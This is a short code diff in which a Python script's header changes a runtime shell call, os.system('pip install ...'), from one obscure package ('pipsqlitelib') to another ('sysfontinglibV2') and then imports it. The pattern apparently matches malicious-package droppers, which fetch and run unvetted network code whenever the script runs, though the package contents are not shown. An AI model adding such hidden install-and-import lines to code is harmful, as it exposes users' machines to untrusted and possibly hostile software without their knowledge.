@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitelib")
-import pipsqlitelib
+os.system("pip install sysfontinglibV2")
+import sysfontinglibV2
 import random
 import requests
 import time
